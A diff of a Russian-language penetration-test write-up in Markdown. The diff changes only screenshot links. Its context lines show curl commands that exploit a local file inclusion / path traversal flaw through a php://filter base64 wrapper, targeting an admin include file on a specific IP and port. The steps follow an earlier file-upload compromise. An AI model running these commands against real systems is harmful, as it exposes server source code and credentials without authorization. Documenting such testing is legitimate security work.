@@ -48,7 +48,7 @@ ___
     
 Ранее реализовав уязвимость **Unrestricted File Upload**, удалось получить представление о структуре файловой системы на сервере.
 
-![](screenshots/OSINT/Censys/censys1.png)
+![](screenshots/TESTING/Path_Traversal/8050/dir_wso.png)
 
 - **Step 2. Получение исходного кода страницы**
 
@@ -62,7 +62,7 @@ ___
 curl "http://92.51.39.106:8050/admin/index.php?page=php://filter/read=convert.base64-encode/resource=../include/admins"
 ```
 
-![](screenshots/SCANNING/nmap/nmap_8050.png)
+![](screenshots/TESTING/Path_Traversal/8050/without_decode.png)
    
 - **Step 3. Декодирование кода**
 
@@ -72,7 +72,7 @@ curl "http://92.51.39.106:8050/admin/index.php?page=php://filter/read=convert.ba
 curl "http://92.51.39.106:8050/admin/index.php?page=php://filter/read=convert.base64-encode/resource=../include/admins" -s | base64 -d
 ```
 
-![](screenshots/SCANNING/nmap/nmap_8050.png)
+![](screenshots/TESTING/Path_Traversal/8050/with_decode.png)
 
 - **Вывод**
     
